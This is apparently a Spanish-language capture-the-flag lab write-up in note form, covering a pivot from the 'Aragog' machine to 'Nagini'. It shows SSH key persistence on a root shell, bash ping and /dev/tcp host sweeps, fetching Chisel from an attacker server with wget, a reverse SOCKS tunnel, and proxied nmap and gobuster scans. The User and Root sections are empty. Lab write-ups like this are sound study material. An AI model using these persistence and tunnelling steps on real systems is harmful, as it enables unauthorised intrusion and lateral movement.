## Summary

Tags: #Pivoting #Linux #Fuzzing #HTTP3 #Chisel #Proxychains 

- IP ->  10.10.0.129
- Ports -> TCP (22, 80), UDP (idk)
- OS ->  Linux
- Services & Applications
    - 22 -> 
    - 80 -> 

## Launchpad

-   **Launchpad**: [https://launchpad.net/ubuntu](https://launchpad.net/ubuntu)

## Pivoting desde Aragog hacia Nagini

Siendo root primero debemos de garantizar el acceso directo a la maquina 'Aragog' y lo haremos colocando con un acceso ssh. 
```bash 
❯ cd /root/ 
❯ cd .ssh/           # Aqui crearemos una 'Authorized Key' publica para podernos conectar y tener una persistencia de acceso directo 
```

En nuestra maquina de atacante nos vamos a crear una clave publica y una clave privada 
```bash 
❯ ssh-keygen                                                     # Creamos una clave publica y una clave privada en nuestra maquina de atacante 
❯ cat ~/.ssh/id_rsa.pub | tr -d '\n' | xclip -sel clip           # Miramos el contenido de nuestra clave publica    
	# ~ = /home/omar/...
	# tr = Quitar el salto de linea
	# xclip = Copiarno el output en la clipboard

# El resultado lo pegaremos en el archivo que crearemos con nombre 'authorized_keys' en la ruta de la maquina victima que es /root/.ssh
❯ nano authorized_keys
```

Una vez garantizado el acceso, procedemos a realizar lo siguiente:
Siendo root miramos las interfaces 
```bash
❯ hostname -I                                # Nos muestra solo la direccion IP de las interfaces 

# Podemos observar que hay dos interfaces, primera con la 192.168.111.38 y la segunda con la IP 10.10.0.128 
```

```bash 
❯ cd /tmp/                                   # Este directorio tiene privilegios de lectura y escritura, por lo que ahi podemos crear scripts
```

Crearemos un archivo llamado 'HotsDiscovery.sh' que nos ayude a ver la trazas ICMP para descubrir las demás interfaces. 
Para ir descubriendo interfaces con el comando ping 
```bash 
!#/bin/bash 

for i in $(seq 1 254); do
	timeout 1 bash -c "ping -c 1 10.10.0.$i" &>/dev/null && echo "[+] Host 10.10.0.$i - ACTIVE" &
done; wait  
```

Le damos permisos de ejecución
```bash 
❯ chmod +x HotsDiscovery.sh       # Le damos permisos de ejecucion 
❯ ./HotsDiscovery.sh              
```

Por si el comando ping no esta disponible, podemos hacerlo por los puertos mas comunes 
```bash
!#/bin/bash 

for i in $(seq 1 254); do
	for port in 21 22 80 443 445 8080; do
		timeout 1 bash -c "echo '' > /dev/tcp/10.10.0.$i/$port" &>/dev/null && echo "[+] Host 10.10.0.$i - PORT $port - OPEN" &
	done 
done; wait 

# Ejecutamos y logramos encontrar la IP 10.10.0.129 de la maquina Nagini
```


Para poder llegar a la IP 10.10.0.129 desde nuestra maquina de atacante, podemos usar **Chisel** la cual nos creara un túnel 

1. Descargamos Chisel a nuestra maquina de atacante 'Chisel > Releases > chisel_1.8.1_linux_amd64.gz'
* [Chisel](https://github.com/jpillora/chisel)

2. Descomprimimos y le damos permisos de ejecución 
```bash 
❯ gunzip <file.gz>                           # Para descompirmir archivos gzip
❯ chmod +x chisel
```

3. Lo transferimos a la maquina victima mediante un servidor HTTP 
```bash
❯ python3 -m http.server 80                 # Nos montamos un servidor http 80
```

4. Desde la maquina victima lo descargamos de la siguiente manera 
```bash
❯ wget http://❮IP❯/chisel                   # Para poder cargar o descargar un archivo especifico desde una IP de atacante
```

5. Lo ejecutamos de la siguiente manera para hacer que solo se abra una sola sesión principal que será la de la maquina de atacante. 
```bash
❯ ./chisel server --reverse -p 1234                                                 # Server 'Maquina de atacante', nuestra IP es 192.169.111.106
❯ ./chisel client 192.168.111.106:1234 R:socks # Cliente 'Maquina victima'

	# R = Remote Port Forwarding
	# IP-Server = IP de la maquina atacante
	# Port-Server = Puerto de la maquina atacante
     # socks = Abre el puerto 1080 de nuestra de atacante 
```

```bash
❯ lsof -i:80                                # Para ver que servicio esta ocupando cierto puerto
```

Debemos de hacer los siguientes cambios después de crear el túnel 
```bash 
❯ nano /etc/proxychains.conf 

# Comentamos el Dinamic_chain, este solo se habilita cuando vamos pasando por varios tuneles
# Activamos el strick_chain, este solo es cuando tenemos un tunel 
# Hasta abajo del archivo agregamos lo siguiente:

sock5 127.0.0.1 1080 
```

## Recon

Forma de verificar e iniciar el reconocimiento de los puertos abiertos en la maquina Nagini
```bash 
❯ seq 1 65535 | xargs -P 500 -I {} proxychains nmap -sT -Pn -p{} -open -T5 -v -n ❮Target IP❯ 2>&1 | grep "tcp open"      # Proxychains nos ayudara que el comando pase por el tunel creado por chisel 

	# P = Tareas en paralelo
# Solo nos muestra los puerto 22 y 80 abiertos 
```

* Siempre debemos de usar **'proxychains'** cuando queramos usar un comando en un túnel. 
```bash 
❯ proxychains whatweb ❮Target IP❯     # Escaneo con whatweb a la maquina victima 
```

Para ver la web de la maquina victima en el Túnel. Debemos de configurar el **'Foxy Proxy'** de nuestro navegador Firefox:
```bash 
Name = Nagini
Proxy Type = SOCKS5
Proxy IP = 127.0.0.1
Port = 1080
```

Para poder hacer Fuzzing en el túnel, lo debemos de hacer de la siguiente manera. 
```bash
❯ gobuster dir -u http://10.10.0.129 -w /usr/share/Seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 20 -x html,php,txt --proxy socks5://127.0.0.1:1080

	# dir -> Modo enumeracion directorios y archivos 
	# u -> Colocamos la url
	# t -> Lanzar peticiones en paralelo al mismo tiempo
	# w -> Ruta del diccionario
	# proxy = Indicamos que hay un proxy de tipo socks5 asi como en donde se encuentra en nuestra maquina
	# x = Buscar archivos con las extensiones html, php, txt

# Encontramos un index.html, note.txt, joomla
```

```bash 
❯ ./chisel client 192.168.111.106:1234 R:socks R:443:10.10.0.129:443/udp      # Cliente 'Maquina victima', nos traemos adicionalmente el puerto 443 de la maquina victima 
```

En note.txt nos dicen que se esta usando un **'HTTP3'** 

```bash
# Ruta para poder ejecutar el http3-client /home/user/quiche/target/debug/examples

❯ ./http3-client ❮https://127.0.0.1❯
```



## User


## Root